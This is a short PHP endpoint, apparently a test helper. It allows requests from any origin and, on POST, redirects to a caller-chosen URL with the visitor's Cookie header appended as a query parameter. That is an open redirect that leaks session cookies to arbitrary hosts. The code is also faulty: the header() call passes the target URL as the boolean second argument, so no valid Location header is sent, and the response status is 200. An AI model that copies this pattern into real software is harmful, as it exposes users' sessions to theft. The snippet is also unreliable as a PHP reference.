<?php
header('Access-Control-Allow-Origin: *');
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  header(
      'Location', $_POST['location'] . '?cookie=' . getallheaders()['Cookie']);
  http_response_code(200);
} else {
  http_response_code(404);
}
?>
